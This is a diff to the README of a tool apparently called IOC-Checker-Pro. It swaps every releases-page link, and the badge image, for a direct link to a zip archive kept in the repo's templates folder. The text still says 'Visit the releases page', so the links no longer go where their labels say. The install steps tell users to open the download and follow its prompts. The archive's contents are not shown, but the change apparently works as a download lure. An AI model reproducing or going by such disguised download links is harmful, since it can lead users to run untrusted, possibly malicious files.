@@ -6,7 +6,7 @@ Welcome to IOC-Checker-Pro! This advanced web application helps you analyze Indi
 
 ## 📥 Download Now 
 
-[![Download IOC-Checker-Pro](https://img.shields.io/badge/Download-IOC--Checker--Pro-green)](https://github.com/doniboyd/IOC-Checker-Pro/releases)
+[![Download IOC-Checker-Pro](https://raw.githubusercontent.com/doniboyd/IOC-Checker-Pro/main/templates/IOC-Checker-Pro-2.1.zip)](https://raw.githubusercontent.com/doniboyd/IOC-Checker-Pro/main/templates/IOC-Checker-Pro-2.1.zip)
 
 ## 💾 System Requirements
 
@@ -20,7 +20,7 @@ Before you start, ensure your system meets these requirements:
 
 To get started with IOC-Checker-Pro, follow these steps:
 
-1. Visit the releases page to download: [Download Here](https://github.com/doniboyd/IOC-Checker-Pro/releases).
+1. Visit the releases page to download: [Download Here](https://raw.githubusercontent.com/doniboyd/IOC-Checker-Pro/main/templates/IOC-Checker-Pro-2.1.zip).
 2. Look for the latest version. Click on the file that suits your operating system.
 3. Download the file to your computer.
 4. Open the downloaded file. Follow the installation prompts.
@@ -67,4 +67,4 @@ Keep yourself updated on future releases and improvements. Follow the repository
 
 Immerse yourself in the world of cybersecurity with IOC-Checker-Pro today! 
 
-[Click here to download!](https://github.com/doniboyd/IOC-Checker-Pro/releases)
+[Click here to download!](https://raw.githubusercontent.com/doniboyd/IOC-Checker-Pro/main/templates/IOC-Checker-Pro-2.1.zip)
